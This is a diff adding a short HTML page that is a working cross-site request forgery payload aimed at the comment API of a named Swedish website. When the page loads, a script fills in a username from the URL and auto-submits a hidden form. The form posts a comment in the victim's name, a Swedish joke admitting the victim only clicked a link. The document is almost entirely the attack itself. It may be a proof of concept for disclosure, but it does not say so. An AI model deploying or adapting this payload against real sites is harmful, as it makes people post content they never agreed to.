@@ -1,0 +1,15 @@
+<html>
+    <body>
+        <form action="https://insikten.lm.se/api/epi/CreateComment/" method="POST">
+            <input type="hidden" name="page" value="112031" />
+			<input type="hidden" name="text" value="Jag gillar bullar, nom nom nom. Men det var inte jag som skrev detta, jag klickade bara på en länk som Johan skickade!" />
+            <input type="hidden" name="user" id="username" value="null" />
+        </form>
+        <script>
+			const urlParams = new URLSearchParams(window.location.search);
+			const username = urlParams.get('user');
+			document.getElementById("username").value = username;
+			document.forms[0].submit();
+        </script>
+    </body>
+</html>
